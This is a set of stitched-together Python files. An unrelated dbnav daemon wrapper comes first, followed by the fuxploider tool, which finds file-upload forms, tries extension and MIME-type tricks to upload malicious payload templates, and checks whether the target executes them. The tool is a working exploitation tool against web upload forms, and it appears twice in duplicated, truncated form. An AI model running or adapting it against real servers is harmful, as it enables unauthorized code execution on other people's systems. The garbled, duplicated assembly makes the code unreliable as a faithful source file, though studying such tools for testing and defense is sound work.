from dbnav.jsonable import from_json

COMMANDS = {
    'dbdiff': 'differ',
    'dbexec': 'executer',
    'dbexport': 'exporter',
    'dbgraph': 'grapher',
    'dbnav': 'navigator'
}


class Wrapper(object):
    def __init__(self, options=None):
        self.options = options

    def write(self):
        try:
            sys.stdout.write(Writer.write(self.run()))
        except BaseException as e:
            log.logger.exception(e)
            return -1
        return 0

    def execute(self):  # pragma: no cover
        """To be overridden by sub classes"""
        pass

    def run(self):
        try:
            if self.options is not None and self.options.daemon:                    
                log.logger.debug('Executing remotely')
                return self.executer(*sys.argv)

            log.logger.debug('Executing locally')
            return self.execute()
        except BaseException as e:
            log.logger.exception(e)
            if log.logger.getEffectiveLevel() <= logging.DEBUG:
                # Start post mortem debugging only when debugging is enabled
                if os.getenv('UNITTEST', 'False') == 'True':
                    raise
                if self.options.trace:                    
                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover
            else:
                # Show the error message if log level is INFO or higher
                log.log_error(e)  # pragma: no cover

    def executer(self, *args):                    
        """Execute remotely"""

        options = self.options

        try:
            # from dbnav import daemon
            # if not daemon.is_running(options):
            #     daemon.start_server(options)

            url = 'http://{host}:{port}/{path}'.format(
                host=options.host,
                port=options.port,
                path=COMMANDS[options.prog])
            request = json.dumps(args[1:])

            log.logger.debug('Request to %s:\n%s', url, request)

            response = urllib2.urlopen(url, request)

            for i in ijson.items(response, 'item'):
                yield from_json(i)
        except urllib2.HTTPError as e:
            raise from_json(json.load(e))
        except urllib2.URLError as e:
            log.logger.error('Daemon not available: %s', e)
        except BaseException as e:
            log.logger.exception(e)

import logging,concurrent.futures
from utils import *
from urllib.parse import urljoin,urlparse
from threading import Lock

class UploadForm :
	def __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None) :
		self.logger = logging.getLogger("fuxploider")
		self.postData = postData
		self.formUrl = formUrl
		url = urlparse(self.formUrl)
		self.schema = url.scheme
		self.host = url.netloc
		self.uploadUrl = urljoin(formUrl, formAction)
		self.session = session
		self.trueRegex = trueRegex
		self.notRegex = notRegex
		self.inputName = inputName
		self.uploadsFolder = uploadsFolder
		self.size = size
		self.validExtensions = []
		self.httpRequests = 0
		self.codeExecUrlPattern = None #pattern for code exec detection using true regex findings
		self.logLock = Lock()
		self.stopThreads = False
		self.shouldLog = True

	#searches for a valid html form containing an input file, sets object parameters correctly
	def setup(self,initUrl) :
		self.formUrl = initUrl
		url = urlparse(self.formUrl)
		self.schema = url.scheme
		self.host = url.netloc

		self.httpRequests = 0
		try :
			initGet = self.session.get(self.formUrl,headers={"Accept-Encoding":None})
			self.httpRequests += 1
			if self.logger.verbosity > 1 :
				printSimpleResponseObject(initGet)
			if self.logger.verbosity > 2 :
				print("\033[36m"+initGet.text+"\033[m")
			if initGet.status_code < 200 or initGet.status_code > 300 :
				self.logger.critical("Server responded with following status : %s - %s",initGet.status_code,initGet.reason)
				exit()
		except Exception as e :
				self.logger.critical("%s : Host unreachable (%s)",getHost(initUrl),e)
				exit()
		#rcuprer le formulaire,le dtecter
		detectedForms = detectForms(initGet.text)
		if len(detectedForms) == 0 :
			self.logger.critical("No HTML form found here")
			exit()
		if len(detectedForms) > 1 :
			self.logger.critical("%s forms found containing file upload inputs, no way to choose which one to test.",len(detectedForms))
			exit()
		if len(detectedForms[0][1]) > 1 :
			self.logger.critical("%s file inputs found inside the same form, no way to choose which one to test.",len(detectedForms[0]))
			exit()

		self.inputName = detectedForms[0][1][0]["name"]
		self.logger.debug("Found the following file upload input : %s",self.inputName)
		formDestination = detectedForms[0][0]

		try :
			self.action = formDestination["action"]
		except :
			self.action = ""
		self.uploadUrl = urljoin(self.formUrl,self.action)

		self.logger.debug("Using following URL for file upload : %s",self.uploadUrl)

		if not self.uploadsFolder and not self.trueRegex :
			self.logger.warning("No uploads folder nor true regex defined, code execution detection will not be possible.")
		elif not self.uploadsFolder and self.trueRegex :
			print("No uploads path provided, code detection can still be done using true regex capturing group.")
			cont = input("Do you want to use the True Regex for code execution detection ? [Y/n] ")
			if cont.lower().startswith("y") or cont == "" :
				preffixPattern = input("Preffix capturing group of the true regex with : ")
				suffixPattern = input("Suffix capturing group of the true regex with : ")
				self.codeExecUrlPattern = preffixPattern+"$captGroup$"+suffixPattern
			else :
				self.logger.warning("Code execution detection will not be possible as there is no path nor regex pattern configured.")
		else :
			pass#uploads folder provided

	#tries to upload a file through the file upload form
	def uploadFile(self,suffix,mime,payload) :
		with tempfile.NamedTemporaryFile(suffix=suffix) as fd :
			fd.write(payload)
			fd.flush()
			fd.seek(0)
			filename = os.path.basename(fd.name)                    
			if self.shouldLog :
				self.logger.debug("Sending file %s with mime type : %s",filename,mime)
			fu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)
			self.httpRequests += 1
			if self.shouldLog :
				if self.logger.verbosity > 1 :
					printSimpleResponseObject(fu)
				if self.logger.verbosity > 2 :
					print("\033[36m"+fu.text+"\033[m")
			
		return (fu,filename)                    

	#detects if a given html code represents an upload success or not
	def isASuccessfulUpload(self,html) :
		result = False
		validExt = False
		if self.notRegex :
			fileUploaded = re.search(self.notRegex,html)
			if fileUploaded == None :
				result = True
				if self.trueRegex :
					moreInfo = re.search(self.trueRegex,html)
					if moreInfo :
						result = str(moreInfo.groups())
		if self.trueRegex and not result :
			fileUploaded = re.search(self.trueRegex,html)
			if fileUploaded :
				try :
					result = str(fileUploaded.group(1))
				except :
					result = str(fileUploaded.group(0))
		return result

	#callback function for matching html text against regex in order to detect successful uploads
	def detectValidExtension(self, future) :
		if not self.stopThreads :
			html = future.result()[0].text
			ext = future.ext[0]

			r = self.isASuccessfulUpload(html)
			if r :
				self.validExtensions.append(ext)
				if self.shouldLog :
					self.logger.info("\033[1m\033[42mExtension %s seems valid for this form.\033[m", ext)
					if r != True :
						self.logger.info("\033[1;32mTrue regex matched the following information : %s\033[m",r)

			return r
		else :
			return None

	#detects valid extensions for this upload form (sending legit files with legit mime types)
	def detectValidExtensions(self,extensions,maxN,extList=None) :
		self.logger.info("### Starting detection of valid extensions ...")
		n = 0
		if extList :
			tmpExtList = []
			for e in extList :
				tmpExtList.append((e,getMime(extensions,e)))
		else :
			tmpExtList = extensions
		validExtensions = []

		extensionsToTest = tmpExtList[0:maxN]
		with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor :
			futures = []
			try :
				for ext in extensionsToTest:
					f = executor.submit(self.uploadFile,"."+ext[0],ext[1],os.urandom(self.size))
					f.ext = ext
					f.add_done_callback(self.detectValidExtension)
					futures.append(f)
				for future in concurrent.futures.as_completed(futures) :
					a = future.result()
					n += 1
			except KeyboardInterrupt :
				self.shouldLog = False
				executor.shutdown(wait=False)
				self.stopThreads = True
				executor._threads.clear()
				concurrent.futures.thread._threads_queues.clear()
		return n

	#detects if code execution is gained, given an url to request and a regex supposed to match the executed code output
	def detectCodeExec(self,url,regex) :
		if self.shouldLog :
			if self.logger.verbosity > 0 :
				self.logger.debug("Requesting %s ...",url)
		
		r = self.session.get(url)
		if self.shouldLog :
			if r.status_code >= 400 :
				self.logger.warning("Code exec detection returned an http code of %s.",r.status_code)
			self.httpRequests += 1
			if self.logger.verbosity > 1 :
				printSimpleResponseObject(r)
			if self.logger.verbosity > 2 :
				print("\033[36m"+r.text+"\033[m")

		res = re.search(regex,r.text)
		if res :
			return True
		else :
			return False

	#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect
	#	if code execution is gained through the uploaded file
	def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :                    
		fu = self.uploadFile(suffix,mime,payload)                    
		uploadRes = self.isASuccessfulUpload(fu[0].text)
		result = {"uploaded":False,"codeExec":False}
		if uploadRes :
			result["uploaded"] = True
			if self.shouldLog :
				self.logger.info("\033[1;32mUpload of '%s' with mime type %s successful\033[m",fu[1], mime)
			
			if uploadRes != True :
				if self.shouldLog :
					self.logger.info("\033[1;32m\tTrue regex matched the following information : %s\033[m",uploadRes)

			if codeExecRegex and valid_regex(codeExecRegex) and (self.uploadsFolder or self.trueRegex) :
				url = None
				secondUrl = None
				if self.uploadsFolder :
					url = self.schema+"://"+self.host+"/"+self.uploadsFolder+"/"+fu[1]                    
					filename = fu[1]
					secondUrl = None
					for b in getPoisoningBytes() :
						if b in filename :
							secondUrl = b.join(url.split(b)[:-1])
				elif self.codeExecUrlPattern :
					#code exec detection through true regex
					url = self.codeExecUrlPattern.replace("$captGroup$",uploadRes)
				else :
					pass
					#self.logger.warning("Impossible to determine where to find the uploaded payload.")
				if url :
					executedCode = self.detectCodeExec(url,codeExecRegex)
					if executedCode :
						result["codeExec"] = True
				if secondUrl :
					executedCode = self.detectCodeExec(secondUrl,codeExecRegex)
					if executedCode :
						result["codeExec"] = True
		return result

	#detects html forms and returns a list of beautifulSoup objects (detected forms)
	def detectForms(html) :
		soup = BeautifulSoup(html,'html.parser')
		detectedForms = soup.find_all("form")
		returnForms = []
		if len(detectedForms) > 0 :
			for f in detectedForms :
				fileInputs = f.findChildren("input",{"type":"file"})
				if len(fileInputs) > 0 :
					returnForms.append((f,fileInputs))

		return returnForms

#!/usr/bin/python3
import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random
from utils import *
from UploadForm import UploadForm
from threading import Lock
#signal.signal(signal.SIGINT, quitting)
version = "0.5.0"
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
logger = logging.getLogger("fuxploider")

coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)
logging.getLogger("requests").setLevel(logging.ERROR)

#################### TEMPLATES DEFINITION HERE ######################
templatesFolder = "payloads"
with open("templates.json","r") as fd :
	templates = json.loads(fd.read())
#######################################################################
templatesNames = [x["templateName"] for x in templates]
templatesSection = "[TEMPLATES]\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload."
templatesSection += "\n\tDefault templates are the following (name - description) : "
for t in templates :
	templatesSection+="\n\t  * '"+t["templateName"]+"' - "+t["description"]

parser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
parser.add_argument("-t","--template",metavar="templateName",nargs=1,dest="template",help="Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.")
parser.add_argument("-r","--regex-override",metavar="regex",nargs=1,dest="regexOverride",help="Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.",type=valid_regex)
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
requiredNamedArgs.add_argument("--true-regex",metavar="regex", help="Regex matching an upload success", type=valid_regex, dest="trueRegex")

exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument("-l","--legit-extensions",metavar="listOfExtensions",dest="legitExtensions",nargs=1,help="Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'")
exclusiveArgs.add_argument("-n",metavar="n",nargs=1,default=["100"],dest="n",help="Number of common extensions to use. Example : -n 100", type=valid_nArg)

exclusiveVerbosityArgs = parser.add_mutually_exclusive_group()
exclusiveVerbosityArgs.add_argument("-v",action="store_true",required=False,dest="verbose",help="Verbose mode")
exclusiveVerbosityArgs.add_argument("-vv",action="store_true",required=False,dest="veryVerbose",help="Very verbose mode")
exclusiveVerbosityArgs.add_argument("-vvv",action="store_true",required=False,dest="veryVeryVerbose",help="Much verbose, very log, wow.")

parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")
parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points. Will not stop at first code exec found.")
parser.add_argument("-T","--threads",metavar="Threads",nargs=1,dest="nbThreads",help="Number of parallel tasks (threads).",type=int,default=[4])

exclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()
exclusiveUserAgentsArgs.add_argument("-U","--user-agent",metavar="useragent",nargs=1,dest="userAgent",help="User-agent to use while requesting the target.",type=str,default=[requests.utils.default_user_agent()])
exclusiveUserAgentsArgs.add_argument("--random-user-agent",action="store_true",required=False,dest="randomUserAgent",help="Use a random user-agent while requesting the target.")

manualFormArgs = parser.add_argument_group('Manual Form Detection arguments')
manualFormArgs.add_argument("-m","--manual-form-detection",action="store_true",dest="manualFormDetection",help="Disable automatic form detection. Useful when automatic detection fails due to: (1) Form loaded using Javascript (2) Multiple file upload forms in URL.")
manualFormArgs.add_argument("--input-name",metavar="image",dest="inputName",help="Name of input for file. Example: <input type=\"file\" name=\"image\">")
manualFormArgs.add_argument("--form-action",default="",metavar="upload.php",dest="formAction",help="Path of form action. Example: <form method=\"POST\" action=\"upload.php\">")

args = parser.parse_args()
args.uploadsPath = args.uploadsPath[0]
args.nbThreads = args.nbThreads[0]
args.userAgent = args.userAgent[0]

if args.randomUserAgent :
	with open("user-agents.txt","r") as fd :
		nb = 0
		for l in fd :
			nb += 1
		fd.seek(0)
		nb = random.randint(0,nb)
		for i in range(0,nb) :
			args.userAgent = fd.readline()[:-1]

if args.template :
	args.template = args.template[0]
	if args.template not in templatesNames :
		logging.warning("Unknown template : %s",args.template)
		cont = input("Use default templates instead ? [Y/n]")
		if not cont.lower().startswith("y") :
			exit()
	else :
		templates = [[x for x in templates if x["templateName"] == args.template][0]]
if args.regexOverride :
	for t in templates :
		t["codeExecRegex"] = args.regexOverride[0]

args.verbosity = 0
if args.verbose :
	args.verbosity = 1
if args.veryVerbose :
	args.verbosity = 2
if args.veryVeryVerbose :
	args.verbosity = 3
logger.verbosity = args.verbosity
if args.verbosity > 0 :
	coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)


if args.proxyCreds and args.proxy == None :
	parser.error("--proxy-creds must be used with --proxy.")

if args.skipRecon and args.legitExtensions == None :
	parser.error("-s switch needs -l switch. Cannot skip recon phase without any known entry point.")

args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024*args.size

if not args.notRegex and not args.trueRegex :
	parser.error("At least one detection method must be provided, either with --not-regex or with --true-regex.")

if args.legitExtensions :
	args.legitExtensions = args.legitExtensions[0].split(",")

if args.cookies :
	args.cookies = postDataFromStringToJSON(args.cookies[0])

if args.manualFormDetection and args.inputName is None:
	parser.error("--manual-form-detection requires --input-name")

print("""\033[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

\033[1m\033[42m{version """+version+"""}\033[m

\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	""")
if args.proxyCreds == True :
	args.proxyCreds = {}
	args.proxyCreds["username"] = input("Proxy username : ")
	args.proxyCreds["password"] = getpass.getpass("Proxy password : ")

now = datetime.datetime.now()

print("[*] starting at "+str(now.hour)+":"+str(now.minute)+":"+str(now.second))

#mimeFile = "mimeTypes.advanced"
mimeFile = "mimeTypes.basic"
extensions = loadExtensions("file",mimeFile)
tmpLegitExt = []
if args.legitExtensions :
	args.legitExtensions = [x.lower() for x in args.legitExtensions]
	foundExt = [a[0] for a in extensions]
	for b in args.legitExtensions :
		if b in foundExt :
			tmpLegitExt.append(b)
		else :
			logging.warning("Extension %s can't be found as a valid/known extension with associated mime type.",b)
args.legitExtensions = tmpLegitExt

postData = postDataFromStringToJSON(args.data)

s = requests.Session()
if args.cookies :
	for key in args.cookies.keys() :
		s.cookies[key] = args.cookies[key]
s.headers = {'User-Agent':args.userAgent}
##### PROXY HANDLING #####
s.trust_env = False
if args.proxy :
	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
		logging.warning("Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch")
	if args.proxyCreds :
		proxyUser = args.proxyCreds["username"]
		proxyPass = args.proxyCreds["password"]
	else :
		proxyUser = args.proxy["username"]
		proxyPass = args.proxy["password"]
	proxyProtocol = args.proxy["protocol"]
	proxyHostname = args.proxy["hostname"]
	proxyPort = args.proxy["port"]
	proxy = ""
	if proxyProtocol != None :
		proxy += proxyProtocol+"://"
	else :
		proxy += "http://"

	if proxyUser != None and proxyPass != None :
		proxy += proxyUser+":"+proxyPass+"@"

	proxy += proxyHostname
	if proxyPort != None :
		proxy += ":"+proxyPort

	if proxyProtocol == "https" :
		proxies = {"https":proxy}
	else :
		proxies = {"http":proxy,"https":proxy}

	s.proxies.update(proxies)
#########################################################

if args.manualFormDetection:
	if args.formAction == "":
		logger.warning("Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string - meaning form action will be set to --url parameter.")
	up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName)
else:
	up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)
	up.setup(args.url)
up.threads = args.nbThreads
#########################################################

############################################################
uploadURL = up.uploadUrl
fileInput = {"name":up.inputName}

###### VALID EXTENSIONS DETECTION FOR THIS FORM ######

a = datetime.datetime.now()

if not args.skipRecon :
	if len(args.legitExtensions) > 0 :
		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
	else :
		n = up.detectValidExtensions(extensions,args.n)
	logger.info("### Tried %s extensions, %s are valid.",n,len(up.validExtensions))
else :
	logger.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
	up.validExtensions = args.legitExtensions

if up.validExtensions == [] :
	logger.error("No valid extension found.")
	exit()

b = datetime.datetime.now()
print("Extensions detection : "+str(b-a))


##############################################################################################################################################
##############################################################################################################################################
cont = input("Start uploading payloads ? [Y/n] : ")
up.shouldLog = True
if cont.lower().startswith("y") or cont == "" :
	pass
else :
	exit("Exiting.")

entryPoints = []
up.stopThreads = True

with open("techniques.json","r") as rawTechniques :
	techniques = json.loads(rawTechniques.read())
logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
c = datetime.datetime.now()
nbOfEntryPointsFound = 0
attempts = []
templatesData = {}

for template in templates :
	templatefd = open(templatesFolder+"/"+template["filename"],"rb")
	templatesData[template["templateName"]] = templatefd.read()
	templatefd.close()
	nastyExt = template["nastyExt"]                    
	nastyMime = getMime(extensions,nastyExt)                    
	nastyExtVariants = template["extVariants"]                    
	for t in techniques :
		for nastyVariant in [nastyExt]+nastyExtVariants :
			for legitExt in up.validExtensions :
				legitMime = getMime(extensions,legitExt)                    
				mime = legitMime if t["mime"] == "legit" else nastyMime                    
				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)                    
				attempts.append({"suffix":suffix,"mime":mime,"templateName":template["templateName"]})                    


stopThreads = False

attemptsTested = 0

with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor :
	futures = []
	try :
		for a in attempts :
			suffix = a["suffix"]
			mime = a["mime"]
			payload = templatesData[a["templateName"]]
			codeExecRegex = [t["codeExecRegex"] for t in templates if t["templateName"] == a["templateName"]][0]

			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)                    
			f.a = a
			futures.append(f)

		for future in concurrent.futures.as_completed(futures) :
			res = future.result()
			attemptsTested += 1
			if not stopThreads :
				if res["codeExec"] :

					foundEntryPoint = future.a
					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",foundEntryPoint["suffix"],foundEntryPoint["mime"],foundEntryPoint["templateName"])
					nbOfEntryPointsFound += 1
					entryPoints.append(foundEntryPoint)

					if not args.detectAllEntryPoints :
						raise KeyboardInterrupt

	except KeyboardInterrupt :
		stopThreads = True
		executor.shutdown(wait=False)
		executor._threads.clear()
		concurrent.futures.thread._threads_queues.clear()
		logger.setLevel(logging.CRITICAL)
		logger.verbosity = -1


################################################################################################################################################
################################################################################################################################################
d = datetime.datetime.now()
#print("Code exec detection : "+str(d-c))
print()
logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
print("Found the following entry points : ")
print(entryPoints)

import logging,concurrent.futures
from utils import *
from urllib.parse import urljoin,urlparse
from threading import Lock

class UploadForm :
	def __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None) :
		self.logger = logging.getLogger("fuxploider")
		self.postData = postData
		self.formUrl = formUrl
		url = urlparse(self.formUrl)
		self.schema = url.scheme
		self.host = url.netloc
		self.uploadUrl = urljoin(formUrl, formAction)
		self.session = session
		self.trueRegex = trueRegex
		self.notRegex = notRegex
		self.inputName = inputName
		self.uploadsFolder = uploadsFolder
		self.size = size
		self.validExtensions = []
		self.httpRequests = 0
		self.codeExecUrlPattern = None #pattern for code exec detection using true regex findings
		self.logLock = Lock()
		self.stopThreads = False
		self.shouldLog = True

	#searches for a valid html form containing an input file, sets object parameters correctly
	def setup(self,initUrl) :
		self.formUrl = initUrl
		url = urlparse(self.formUrl)
		self.schema = url.scheme
		self.host = url.netloc

		self.httpRequests = 0
		try :
			initGet = self.session.get(self.formUrl,headers={"Accept-Encoding":None})
			self.httpRequests += 1
			if self.logger.verbosity > 1 :
				printSimpleResponseObject(initGet)
			if self.logger.verbosity > 2 :
				print("\033[36m"+initGet.text+"\033[m")
			if initGet.status_code < 200 or initGet.status_code > 300 :
				self.logger.critical("Server responded with following status : %s - %s",initGet.status_code,initGet.reason)
				exit()
		except Exception as e :
				self.logger.critical("%s : Host unreachable (%s)",getHost(initUrl),e)
				exit()
		#rcuprer le formulaire,le dtecter
		detectedForms = detectForms(initGet.text)
		if len(detectedForms) == 0 :
			self.logger.critical("No HTML form found here")
			exit()
		if len(detectedForms) > 1 :
			self.logger.critical("%s forms found containing file upload inputs, no way to choose which one to test.",len(detectedForms))
			exit()
		if len(detectedForms[0][1]) > 1 :
			self.logger.critical("%s file inputs found inside the same form, no way to choose which one to test.",len(detectedForms[0]))
			exit()

		self.inputName = detectedForms[0][1][0]["name"]
		self.logger.debug("Found the following file upload input : %s",self.inputName)
		formDestination = detectedForms[0][0]

		try :
			self.action = formDestination["action"]
		except :
			self.action = ""
		self.uploadUrl = urljoin(self.formUrl,self.action)

		self.logger.debug("Using following URL for file upload : %s",self.uploadUrl)

		if not self.uploadsFolder and not self.trueRegex :
			self.logger.warning("No uploads folder nor true regex defined, code execution detection will not be possible.")
		elif not self.uploadsFolder and self.trueRegex :
			print("No uploads path provided, code detection can still be done using true regex capturing group.")
			cont = input("Do you want to use the True Regex for code execution detection ? [Y/n] ")
			if cont.lower().startswith("y") or cont == "" :
				preffixPattern = input("Preffix capturing group of the true regex with : ")
				suffixPattern = input("Suffix capturing group of the true regex with : ")
				self.codeExecUrlPattern = preffixPattern+"$captGroup$"+suffixPattern
			else :
				self.logger.warning("Code execution detection will not be possible as there is no path nor regex pattern configured.")
		else :
			pass#uploads folder provided

	#tries to upload a file through the file upload form
	def uploadFile(self,suffix,mime,payload) :
		with tempfile.NamedTemporaryFile(suffix=suffix) as fd :
			fd.write(payload)
			fd.flush()
			fd.seek(0)
			filename = os.path.basename(fd.name)                    
			if self.shouldLog :
				self.logger.debug("Sending file %s with mime type : %s",filename,mime)
			fu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)
			self.httpRequests += 1
			if self.shouldLog :
				if self.logger.verbosity > 1 :
					printSimpleResponseObject(fu)
				if self.logger.verbosity > 2 :
					print("\033[36m"+fu.text+"\033[m")
			
		return (fu,filename)                    

	#detects if a given html code represents an upload success or not
	def isASuccessfulUpload(self,html) :
		result = False
		validExt = False
		if self.notRegex :
			fileUploaded = re.search(self.notRegex,html)
			if fileUploaded == None :
				result = True
				if self.trueRegex :
					moreInfo = re.search(self.trueRegex,html)
					if moreInfo :
						result = str(moreInfo.groups())
		if self.trueRegex and not result :
			fileUploaded = re.search(self.trueRegex,html)
			if fileUploaded :
				try :
					result = str(fileUploaded.group(1))
				except :
					result = str(fileUploaded.group(0))
		return result

	#callback function for matching html text against regex in order to detect successful uploads
	def detectValidExtension(self, future) :
		if not self.stopThreads :
			html = future.result()[0].text
			ext = future.ext[0]

			r = self.isASuccessfulUpload(html)
			if r :
				self.validExtensions.append(ext)
				if self.shouldLog :
					self.logger.info("\033[1m\033[42mExtension %s seems valid for this form.\033[m", ext)
					if r != True :
						self.logger.info("\033[1;32mTrue regex matched the following information : %s\033[m",r)

			return r
		else :
			return None

	#detects valid extensions for this upload form (sending legit files with legit mime types)
	def detectValidExtensions(self,extensions,maxN,extList=None) :
		self.logger.info("### Starting detection of valid extensions ...")
		n = 0
		if extList :
			tmpExtList = []
			for e in extList :
				tmpExtList.append((e,getMime(extensions,e)))
		else :
			tmpExtList = extensions
		validExtensions = []

		extensionsToTest = tmpExtList[0:maxN]
		with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor :
			futures = []
			try :
				for ext in extensionsToTest:
					f = executor.submit(self.uploadFile,"."+ext[0],ext[1],os.urandom(self.size))
					f.ext = ext
					f.add_done_callback(self.detectValidExtension)
					futures.append(f)
				for future in concurrent.futures.as_completed(futures) :
					a = future.result()
					n += 1
			except KeyboardInterrupt :
				self.shouldLog = False
				executor.shutdown(wait=False)
				self.stopThreads = True
				executor._threads.clear()
				concurrent.futures.thread._threads_queues.clear()
		return n

	#detects if code execution is gained, given an url to request and a regex supposed to match the executed code output
	def detectCodeExec(self,url,regex) :
		if self.shouldLog :
			if self.logger.verbosity > 0 :
				self.logger.debug("Requesting %s ...",url)
		
		r = self.session.get(url)
		if self.shouldLog :
			if r.status_code >= 400 :
				self.logger.warning("Code exec detection returned an http code of %s.",r.status_code)
			self.httpRequests += 1
			if self.logger.verbosity > 1 :
				printSimpleResponseObject(r)
			if self.logger.verbosity > 2 :
				print("\033[36m"+r.text+"\033[m")

		res = re.search(regex,r.text)
		if res :
			return True
		else :
			return False

	#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect
	#	if code execution is gained through the uploaded file
	def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :                    
		fu = self.uploadFile(suffix,mime,payload)                    
		uploadRes = self.isASuccessfulUpload(fu[0].text)
		result = {"uploaded":False,"codeExec":False}
		if uploadRes :
			result["uploaded"] = True
			if self.shouldLog :
				self.logger.info("\033[1;32mUpload of '%s' with mime type %s successful\033[m",fu[1], mime)
			
			if uploadRes != True :
				if self.shouldLog :
					self.logger.info("\033[1;32m\tTrue regex matched the following information : %s\033[m",uploadRes)

			if codeExecRegex and valid_regex(codeExecRegex) and (self.uploadsFolder or self.trueRegex) :
				url = None
				secondUrl = None
				if self.uploadsFolder :
					url = self.schema+"://"+self.host+"/"+self.uploadsFolder+"/"+fu[1]                    
					filename = fu[1]
					secondUrl = None
					for b in getPoisoningBytes() :
						if b in filename :
							secondUrl = b.join(url.split(b)[:-1])
				elif self.codeExecUrlPattern :
					#code exec detection through true regex
					url = self.codeExecUrlPattern.replace("$captGroup$",uploadRes)
				else :
					pass
					#self.logger.warning("Impossible to determine where to find the uploaded payload.")
				if url :
					executedCode = self.detectCodeExec(url,codeExecRegex)
					if executedCode :
						result["codeExec"] = True
				if secondUrl :
					executedCode = self.detectCodeExec(secondUrl,codeExecRegex)
					if executedCode :
						result["codeExec"] = True
		return result

	#detects html forms and returns a list of beautifulSoup objects (detected forms)
	def detectForms(html) :
		soup = BeautifulSoup(html,'html.parser')
		detectedForms = soup.find_all("form")
		returnForms = []
		if len(detectedForms) > 0 :
			for f in detectedForms :
				fileInputs = f.findChildren("input",{"type":"file"})
				if len(fileInputs) > 0 :
					returnForms.append((f,fileInputs))

		return returnForms

#!/usr/bin/python3
import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random
from utils import *
from UploadForm import UploadForm
from threading import Lock
#signal.signal(signal.SIGINT, quitting)
version = "0.5.0"
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
logger = logging.getLogger("fuxploider")

coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)
logging.getLogger("requests").setLevel(logging.ERROR)

#################### TEMPLATES DEFINITION HERE ######################
templatesFolder = "payloads"
with open("templates.json","r") as fd :
	templates = json.loads(fd.read())
#######################################################################
templatesNames = [x["templateName"] for x in templates]
